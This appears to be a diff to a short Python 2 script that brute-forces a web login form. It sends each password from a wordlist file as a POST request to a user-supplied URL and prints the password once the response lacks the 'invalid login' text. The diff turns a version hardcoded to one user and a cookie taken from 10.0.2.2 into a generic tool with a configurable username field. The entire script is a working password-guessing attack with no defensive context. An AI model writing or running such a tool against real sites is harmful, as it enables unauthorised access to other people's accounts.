@@ -7,21 +7,21 @@ class bc:
     RED = '\033[91m'
     BOLD = '\033[1m'
 
-
 #cookies
-s=requests.Session();c=s.get("http://10.0.2.2");ck=dict(c.cookies);cc = ck['_usse']
+#s=requests.Session();c=s.get("http://10.0.2.2");ck=dict(c.cookies);cc = ck['_usse']
 
-url = raw_input("\nUrl post: ")+"?gfd="+cc
+url = raw_input("\nUrl post: ")
+user = (raw_input("Enter ((formname:user)): ").strip()).split(":")
 ter = raw_input("Invalid login response: ")
-pwls = raw_input("Enter psw file [empty = psw.txt]: ").strip("' ") or "psw.txt";psf = open(pwls, "r").readlines()
+pswfile = raw_input("Enter psw file [empty = psw.txt]: ").strip("' ") or "psw.txt";pswlines = open(pswfile, "r").readlines()
 
-print("\n")
-for j in psf:
- jb=j.strip()
- http = requests.post(url, data={"lo_password":jb,"lo_name":"toballz","lo_auth":cc},cookies=ck)
+for psw in pswlines:
+ password=psw.strip()
+#,cookies=ck
+ http = requests.post(url, data={"password":password,user[0]:user[1],"btnlogin":"az"})
  con = http.content
  if ter not in con:
-  print bc.OKGREEN,bc.BOLD+("\n [*+*] Correct password: "+jb+">>>>>>>>>>>>>>>>>.\n")
+  print bc.OKGREEN,bc.BOLD+("\n[*+*] Correct password: "+password+"   >>>>>>>>>>>>>>>>>.\n")
   break;
  else:
-  print("[!!!] invalid password: "+jb)
+  print("[!!!] invalid password: "+password)
